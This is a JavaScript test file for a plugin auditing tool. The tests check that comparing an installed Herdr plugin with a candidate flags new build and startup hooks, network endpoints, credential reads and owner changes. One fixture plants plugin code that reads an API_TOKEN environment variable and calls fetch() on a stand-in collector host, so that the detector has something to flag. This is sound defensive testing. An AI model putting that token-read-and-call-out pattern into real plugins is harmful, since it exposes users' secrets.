import assert from "node:assert/strict";
import { EventEmitter } from "node:events";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";

import { auditInstalled, auditSource } from "../src/audit/audit.mjs";
import { EXIT } from "../src/cli/contract.mjs";
import { main } from "../src/cli/main.mjs";
import { compareInstalled, mergeComparison } from "../src/compare/compare.mjs";
import { diffReceipts } from "../src/compare/diff.mjs";
import { parsePluginList } from "../src/herdr/cli.mjs";
import { validateReceiptContract } from "../src/receipt/contract.mjs";

const INSTALLED_MANIFEST = `
id = "example.compare"
name = "Compare fixture"
version = "1.0.0"
min_herdr_version = "0.8.0"
platforms = ["linux", "macos"]

[[actions]]
id = "run"
title = "Run"
command = ["node", "run.mjs"]
`;

function envelope(root, overrides = {}) {
	return {
		id: "cli:plugin",
		result: {
			type: "plugin_list",
			plugins: [
				{
					plugin_id: "example.compare",
					manifest_path: join(root, "herdr-plugin.toml"),
					plugin_root: root,
					source: {
						kind: "github",
						owner: "original-owner",
						repo: "plugin",
						resolved_commit: "1111111111111111111111111111111111111111",
					},
					...overrides,
				},
			],
		},
	};
}

function fakeSpawn(payload) {
	return () => {
		const child = new EventEmitter();
		child.stdout = new EventEmitter();
		child.stderr = new EventEmitter();
		child.kill = () => true;
		queueMicrotask(() => {
			child.stdout.emit("data", Buffer.from(JSON.stringify(payload)));
			child.emit("close", 0);
		});
		return child;
	};
}

async function withPair(run, options = {}) {
	const installed = await mkdtemp(join(tmpdir(), "herdr-xray-installed-"));
	const candidate = await mkdtemp(join(tmpdir(), "herdr-xray-candidate-"));
	try {
		await writeFile(join(installed, "herdr-plugin.toml"), INSTALLED_MANIFEST);
		await writeFile(join(installed, "run.mjs"), "export const value = 1;\n");
		await writeFile(
			join(candidate, "herdr-plugin.toml"),
			options.candidateManifest ?? INSTALLED_MANIFEST,
		);
		await writeFile(
			join(candidate, "run.mjs"),
			options.candidateRun ?? "export const value = 1;\n",
		);
		for (const [name, content] of Object.entries(
			options.candidateFiles ?? {},
		)) {
			await writeFile(join(candidate, name), content);
		}
		await run({ installed, candidate });
	} finally {
		await rm(installed, { recursive: true, force: true });
		await rm(candidate, { recursive: true, force: true });
	}
}

async function comparePair(paths, options = {}) {
	return await compareInstalled("example.compare", paths.candidate, {
		plugins: parsePluginList(
			envelope(paths.installed, options.installedSource),
		),
		...options.auditOptions,
	});
}

test("an unchanged candidate compares cleanly and stays schema-shaped", async () => {
	await withPair(async (paths) => {
		const receipt = await comparePair(paths);
		assert.deepEqual(validateReceiptContract(receipt), []);
		assert.deepEqual(
			receipt.comparison.changes.filter((entry) => entry.kind !== "identity"),
			[],
		);
		assert.equal(receipt.completeness.dimensions.comparison.status, "complete");
		assert.match(
			receipt.comparison.baselineAnalysisHash,
			/^sha256:[0-9a-f]{64}$/,
		);
		assert.equal(
			receipt.subject.installedBaseline.analysisHash,
			receipt.comparison.baselineAnalysisHash,
		);
		assert.equal(
			receipt.subject.installedBaseline.plugin.id,
			"example.compare",
		);
	});
});

test("new automatic execution, network, and credential surfaces are reported", async () => {
	await withPair(
		async (paths) => {
			const receipt = await comparePair(paths);
			const subjects = receipt.comparison.changes.map((entry) => entry.subject);
			assert.equal(
				receipt.comparison.changes.some(
					(entry) =>
						entry.kind === "graph" &&
						entry.change === "added" &&
						entry.severity === "high" &&
						entry.subject === "trigger|build",
				),
				true,
				JSON.stringify(subjects),
			);
			assert.equal(
				receipt.comparison.changes.some(
					(entry) =>
						entry.change === "added" &&
						entry.severity === "high" &&
						entry.subject === "trigger|startup",
				),
				true,
			);
			assert.equal(
				receipt.findings.some(
					(entry) => entry.ruleId === "xray.network.endpoint",
				),
				true,
			);
			assert.equal(
				receipt.comparison.changes.some(
					(entry) =>
						entry.kind === "finding" &&
						entry.change === "added" &&
						entry.subject.includes("xray.credential.environment-read"),
				),
				true,
			);
			assert.equal(
				receipt.comparison.changes.some(
					(entry) =>
						entry.kind === "reachable-file" && entry.change === "changed",
				),
				true,
			);
		},
		{
			candidateManifest: `${INSTALLED_MANIFEST}
[[build]]
command = ["node", "build.mjs"]

[[startup]]
command = ["node", "serve.mjs"]
`,
			candidateRun: `const token = process.env.API_TOKEN;\nfetch("https://collector.example.test/report");\n`,
			candidateFiles: {
				"build.mjs": "export const build = 1;\n",
				"serve.mjs": "export const serve = 1;\n",
			},
		},
	);
});

test("same plugin id from a different owner is a prominent high finding", async () => {
	await withPair(async (paths) => {
		const baseline = await auditInstalled("example.compare", {
			plugins: parsePluginList(
				envelope(paths.installed, {
					source: {
						kind: "github",
						owner: "original-owner",
						repo: "plugin",
						resolved_commit: "1111111111111111111111111111111111111111",
					},
				}),
			),
		});
		const candidate = await auditSource(paths.candidate);
		const impostor = {
			...candidate,
			subject: {
				...candidate.subject,
				source: {
					...candidate.subject.source,
					kind: "github",
					owner: "different-owner",
					repo: "plugin",
					subdir: null,
					requestedRef: "main",
					resolvedCommit: "2222222222222222222222222222222222222222",
				},
			},
		};
		const receipt = mergeComparison(baseline, impostor);
		const identity = receipt.findings.find(
			(entry) => entry.ruleId === "xray.identity.source-changed",
		);
		assert.notEqual(identity, undefined);
		assert.equal(identity.severity, "high");
		assert.match(identity.title, /different-owner/);
		assert.equal(
			receipt.comparison.changes.some(
				(entry) =>
					entry.kind === "identity" &&
					entry.severity === "high" &&
					entry.subject.startsWith("source.owner:"),
			),
			true,
		);
	});
});

test("an unverifiable local candidate is not reported as an ownership change", async () => {
	await withPair(async (paths) => {
		const receipt = await comparePair(paths);
		assert.equal(
			receipt.findings.some(
				(entry) => entry.ruleId === "xray.identity.source-changed",
			),
			false,
		);
		const upstream = receipt.comparison.changes.filter((entry) =>
			entry.subject.startsWith("source."),
		);
		assert.deepEqual(
			upstream.map((entry) => [entry.severity, entry.subject]),
			[["low", "source.upstream: original-owner/plugin -> <unverifiable>"]],
		);
	});
});

test("platform and minimum Herdr version changes are separate findings", async () => {
	await withPair(
		async (paths) => {
			const receipt = await comparePair(paths);
			assert.equal(
				receipt.findings.some(
					(entry) => entry.ruleId === "xray.identity.platform-changed",
				),
				true,
			);
			assert.equal(
				receipt.findings.some(
					(entry) => entry.ruleId === "xray.identity.herdr-version-changed",
				),
				true,
			);
		},
		{
			candidateManifest: `
id = "example.compare"
name = "Compare fixture"
version = "2.0.0"
min_herdr_version = "0.9.0"
platforms = ["linux", "macos", "windows"]

[[actions]]
id = "run"
title = "Run"
command = ["node", "run.mjs"]
`,
		},
	);
});

test("removed surfaces are reported without inflating severity", async () => {
	await withPair(
		async (paths) => {
			const receipt = await comparePair(paths);
			const removed = receipt.comparison.changes.filter(
				(entry) => entry.change === "removed",
			);
			assert.notEqual(removed.length, 0);
			assert.equal(
				removed.every((entry) => entry.severity === "info"),
				true,
			);
		},
		{
			candidateManifest: `
id = "example.compare"
name = "Compare fixture"
version = "1.0.0"
min_herdr_version = "0.8.0"
platforms = ["linux", "macos"]

[[panes]]
id = "view"
title = "View"
command = ["node", "run.mjs"]
`,
		},
	);
});

test("reordered platforms do not invent a change", () => {
	const base = {
		subject: {
			plugin: {
				id: "x",
				name: "x",
				version: "1",
				minHerdrVersion: "0.8.0",
				platforms: [],
			},
			source: {
				kind: "local",
				owner: null,
				repo: null,
				subdir: null,
				resolvedCommit: null,
			},
		},
		graph: {
			nodes: [
				{
					id: "n1",
					type: "trigger",
					label: "build",
					effectivePlatforms: ["linux", "windows"],
				},
			],
			edges: [],
		},
		findings: [],
		completeness: { dimensions: {}, unstable: false },
		provenance: { files: [] },
	};
	const candidate = {
		...base,
		graph: {
			nodes: [
				{
					id: "n1",
					type: "trigger",
					label: "build",
					effectivePlatforms: ["windows", "linux"],
				},
			],
			edges: [],
		},
	};
	const { changes } = diffReceipts(base, candidate, { comparisonChanges: 500 });
	assert.equal(
		changes.some(
			(entry) => entry.kind === "graph" && entry.change === "changed",
		),
		false,
		JSON.stringify(changes),
	);
});

test("undefined effectivePlatforms does not crash diff", () => {
	const base = {
		subject: {
			plugin: {
				id: "x",
				name: "x",
				version: "1",
				minHerdrVersion: "0.8.0",
				platforms: [],
			},
			source: {
				kind: "local",
				owner: null,
				repo: null,
				subdir: null,
				resolvedCommit: null,
			},
		},
		graph: {
			nodes: [{ id: "n1", type: "trigger", label: "build" }],
			edges: [{ id: "e1", type: "invokes", from: "n1", to: "n1" }],
		},
		findings: [],
		completeness: { dimensions: {}, unstable: false },
		provenance: { files: [] },
	};
	const candidate = {
		...base,
		graph: {
			nodes: [
				{
					id: "n1",
					type: "trigger",
					label: "build",
					effectivePlatforms: ["linux"],
				},
			],
			edges: [
				{
					id: "e1",
					type: "invokes",
					from: "n1",
					to: "n1",
					effectivePlatforms: ["linux"],
				},
			],
		},
	};
	assert.doesNotThrow(() =>
		diffReceipts(base, candidate, { comparisonChanges: 500 }),
	);
	const { changes } = diffReceipts(base, candidate, { comparisonChanges: 500 });
	assert.equal(
		changes.some((entry) => entry.subject.includes("<none> -> linux")),
		true,
	);
});

test("platform scope expansion is reported as a high execution change", async () => {
	const installedManifest = `
id = "example.compare"
name = "Compare fixture"
version = "1.0.0"
min_herdr_version = "0.8.0"
platforms = ["linux", "macos"]

[[build]]
command = ["node", "build.mjs"]
platforms = ["linux"]

[[actions]]
id = "run"
title = "Run"
command = ["node", "run.mjs"]
`;
	const candidateManifest = `
id = "example.compare"
name = "Compare fixture"
version = "1.0.0"
min_herdr_version = "0.8.0"
platforms = ["linux", "macos"]

[[build]]
command = ["node", "build.mjs"]
platforms = ["linux", "macos", "windows"]

[[actions]]
id = "run"
title = "Run"
command = ["node", "run.mjs"]
`;
	await withPair(
		async (paths) => {
			await writeFile(
				join(paths.installed, "herdr-plugin.toml"),
				installedManifest,
			);
			const receipt = await comparePair(paths);
			assert.equal(
				receipt.comparison.changes.some(
					(entry) =>
						entry.kind === "graph" &&
						entry.change === "changed" &&
						entry.severity === "high" &&
						entry.subject.startsWith("trigger|build:"),
				),
				true,
				JSON.stringify(receipt.comparison.changes),
			);
		},
		{ candidateManifest },
	);
});

test("manifest reordering does not invent execution changes", async () => {
	const first = `
id = "example.compare"
name = "Compare fixture"
version = "1.0.0"
min_herdr_version = "0.8.0"
platforms = ["linux", "macos"]

[[actions]]
id = "alpha"
title = "Alpha"
command = ["node", "run.mjs"]

[[actions]]
id = "beta"
title = "Beta"
command = ["node", "run.mjs", "--beta"]
`;
	const second = `
id = "example.compare"
name = "Compare fixture"
version = "1.0.0"
min_herdr_version = "0.8.0"
platforms = ["linux", "macos"]

[[actions]]
id = "beta"
title = "Beta"
command = ["node", "run.mjs", "--beta"]

[[actions]]
id = "alpha"
title = "Alpha"
command = ["node", "run.mjs"]
`;
	await withPair(
		async (paths) => {
			await writeFile(join(paths.installed, "herdr-plugin.toml"), first);
			const receipt = await comparePair(paths);
			assert.deepEqual(
				receipt.comparison.changes.filter((entry) => entry.kind === "graph"),
				[],
			);
		},
		{ candidateManifest: second },
	);
});

test("the change limit truncates instead of hiding an oversized diff", async () => {
	await withPair(
		async (paths) => {
			const receipt = await comparePair(paths, {
				auditOptions: { limits: { comparisonChanges: 2 } },
			});
			assert.equal(receipt.comparison.changes.length, 2);
			assert.equal(
				receipt.completeness.dimensions.comparison.status,
				"partial",
			);
			assert.equal(receipt.completeness.complete, false);
			assert.equal(
				receipt.completeness.dimensions.comparison.limit,
				"comparisonChanges",
			);
			assert.deepEqual(validateReceiptContract(receipt), []);
		},
		{
			candidateManifest: `${INSTALLED_MANIFEST}
[[build]]
command = ["node", "build.mjs"]

[[startup]]
command = ["node", "serve.mjs"]
`,
			candidateFiles: {
				"build.mjs": "export const build = 1;\n",
				"serve.mjs": "export const serve = 1;\n",
			},
		},
	);
});

test("comparison is unavailable rather than invented when identity is missing", async () => {
	await withPair(async (paths) => {
		const candidate = await auditSource(paths.candidate);
		const baseline = await auditInstalled("example.compare", {
			plugins: parsePluginList(envelope(paths.installed)),
		});
		const receipt = mergeComparison(
			{ ...baseline, subject: { ...baseline.subject, plugin: null } },
			candidate,
		);
		assert.equal(receipt.comparison, null);
		assert.equal(receipt.subject.installedBaseline, null);
		assert.deepEqual(validateReceiptContract(receipt), []);
		assert.deepEqual(Object.keys(receipt.completeness.dimensions.comparison), [
			"status",
			"reason",
			"limit",
		]);
		assert.equal(
			receipt.completeness.dimensions.comparison.status,
			"unavailable",
		);
		assert.equal(receipt.completeness.complete, false);
	});
});

test("compare CLI renders both report formats and honors policy exits", async () => {
	await withPair(
		async (paths) => {
			const listing = envelope(paths.installed);
			const capture = () => {
				let stdout = "";
				let stderr = "";
				return {
					io: {
						stdout: { write: (text) => (stdout += text) },
						stderr: { write: (text) => (stderr += text) },
						spawn: fakeSpawn(listing),
					},
					output: () => ({ stdout, stderr }),
				};
			};

			const terminal = capture();
			assert.equal(
				await main(
					["compare", "example.compare", paths.candidate],
					terminal.io,
				),
				EXIT.OK,
			);
			assert.match(
				terminal.output().stdout,
				/Changes since the installed version/,
			);

			const markdown = capture();
			assert.equal(
				await main(
					[
						"compare",
						"example.compare",
						paths.candidate,
						"--format",
						"markdown",
					],
					markdown.io,
				),
				EXIT.OK,
			);
			assert.match(
				markdown.output().stdout,
				/## Changes since the installed version/,
			);

			const policy = capture();
			assert.equal(
				await main(
					[
						"compare",
						"example.compare",
						paths.candidate,
						"--fail-on-severity",
						"high",
					],
					policy.io,
				),
				EXIT.POLICY,
			);

			const unavailable = capture();
			assert.equal(
				await main(
					["compare", "missing.plugin", paths.candidate],
					unavailable.io,
				),
				EXIT.INCOMPLETE,
			);
			assert.match(unavailable.output().stderr, /compare failed/);
		},
		{
			candidateManifest: `${INSTALLED_MANIFEST}
[[build]]
command = ["node", "build.mjs"]
`,
			candidateFiles: { "build.mjs": "export const build = 1;\n" },
		},
	);
});
